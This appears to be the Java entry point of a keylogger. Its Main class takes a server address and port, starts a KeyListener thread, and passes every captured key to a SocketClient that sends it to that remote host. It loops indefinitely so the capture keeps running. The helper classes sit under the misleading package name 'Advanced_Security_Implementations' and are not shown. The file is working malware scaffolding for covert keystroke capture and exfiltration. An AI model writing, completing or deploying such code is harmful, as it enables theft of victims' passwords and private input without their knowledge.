package org.insecurity_quiz;

import org.insecurity_quiz.Advanced_Security_Implementations.KeyListener;
import org.insecurity_quiz.Advanced_Security_Implementations.SocketClient;

public class Main {
    public static void main(String[] args) {
        if (args.length != 2) {
            System.err.println("Usage: java Main <server_address> <server_port>");
            System.exit(1);
        }

        // Parse command line arguments
        String serverAddress = args[0];
        int serverPort = Integer.parseInt(args[1]);

        System.out.println("Starting key listener...");

        // Create a SocketClient object and a KeyListener object
        // SocketClient: server address to send to, server port to send to
        SocketClient socketClient = new SocketClient(serverAddress, serverPort);
        KeyListener KeyListener = new KeyListener(socketClient::send);
        // Start the KeyListener thread
        KeyListener.start();

        // Keep the main thread running to allow the key listener thread to keep running
        while (true) {
            try {
                Thread.sleep(1000);
            }
            catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}